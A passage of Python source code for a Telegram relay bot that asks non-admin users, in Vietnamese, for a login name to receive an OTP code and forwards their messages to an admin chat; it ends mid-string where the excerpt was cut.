import telebot
import os

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN_2")
ADMIN_ID = int(os.environ.get("ADMIN_ID"))

bot = telebot.TeleBot(TELEGRAM_TOKEN)
user_map = {}

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.reply_to(message, "Đồng chí cung cấp tên đăng nhập để nhận mã OTP")

@bot.message_handler(func=lambda msg: msg.chat.id != ADMIN_ID)
def from_user(message):
    user = message.from_user
    name = user.first_name + (f" @{user.username}" if user.username else "")
    sent = bot.send_message(
        ADMIN_ID,
        f"📌 *[BOT 2]*
